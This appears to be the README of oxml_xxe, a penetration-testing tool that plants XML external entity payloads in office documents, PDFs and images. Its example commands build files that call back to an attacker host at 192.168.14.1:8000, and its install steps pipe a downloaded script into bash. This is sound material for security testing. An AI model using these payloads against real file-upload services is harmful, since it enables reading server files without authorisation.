# oxml_xxe
This tool is meant to help test XXE vulnerabilities in ~~OXML document~~ file formats. Currently supported:

- DOCX/XLSX/PPTX
- ODT
- PDF
- JPG
- GIF (experimental)

BH USA 2015 Presentation:

[Exploiting XXE in File Upload Functionality (Slides)](http://oxmlxxe.github.io/reveal.js/slides.html#/) [(Recorded Webcast)](https://www.blackhat.com/html/webcast/11192015-exploiting-xml-entity-vulnerabilities-in-file-parsing-functionality.html)

Blog Posts on the topic:

[Exploiting XXE Vulnerabilities in OXML Documents - Part 1](http://www.silentrobots.com/blog/2015/03/04/oxml_xxe/)

# Installation

Installation is easy, you will need a copy of Ruby and two gems.

```
gem install highline
gem install zipruby
```

or


```
gem install bundler
bundle install
```

To install on  Kali Linux (rolling), if you receive the error "ERROR:  Error installing zipruby", you will need to run the following commands before installing zipruby (there may be other solutions).


```
gpg2 --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
\curl -sSL https://get.rvm.io | bash -s stable --ruby
```
# Quick Examples

## Build a PDF with XXE in XMP (metadata)
```
ruby oxml_xxe.rb --poc pdf -i 192.168.14.1:8000
```

## Build a DOCX with XXE (connecting back to 192.168.14.1:8000)
```
ruby oxml_xxe.rb -s -i 192.168.14.1:8000

Select payload 11 ("remote_DTD")
```

## Build a XLSX with XXE (connecting back to ftp://192.168.14.1:8000)
```
ruby oxml_xxe.rb -f samples/sample.xlsx -s -i ftp://192.168.14.1:8000

Select payload 11 ("remote_DTD")
```


# Main Modes

There are two main modes:

## Build Mode ("-b")

Build mode adds a DOCTYPE and inserts the XML Entity into the file of the users choice.

## String Replacement Mode ("-s")

String replacement mode goes through and looks for the symbol § in the document. The XML Entity ("&xxe;") replaces any instances of this symbol. Note, you can open the document in and insert § anywhere to have it replaced. The common use case would be a web application which reads in a xlsx and then prints the results to the screen. Exploiting the XXE it would be possible to have the contents printed to the screen.

